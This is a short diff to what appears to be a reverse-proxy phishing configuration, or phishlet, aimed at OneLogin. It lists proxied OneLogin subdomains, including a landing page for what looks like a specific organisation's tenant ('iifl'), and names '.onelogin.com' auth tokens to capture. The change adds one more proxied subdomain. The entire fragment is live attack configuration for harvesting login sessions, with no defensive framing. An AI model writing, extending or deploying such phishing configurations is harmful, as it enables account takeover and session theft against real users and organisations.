@@ -5,8 +5,9 @@ proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'onelogin.com', session: false, is_landing: false }
   - {phish_sub: 'iifl', orig_sub: 'iifl', domain: 'onelogin.com', session: true, is_landing: true}
   - {phish_sub: 'portal-cdn', orig_sub: 'portal-cdn', domain: 'onelogin.com', session: false, is_landing: false}
-
+  - {phish_sub: 'cdn01', orig_sub: 'cdn01', domain: 'onelogin.com', session: false, is_landing: false}
   - {phish_sub: 'web-login-v2-cdn', orig_sub: 'web-login-v2-cdn', domain: 'onelogin.com', session: false, is_landing: false}
+  
 sub_filters: []
 auth_tokens:
   - domain: '.onelogin.com'
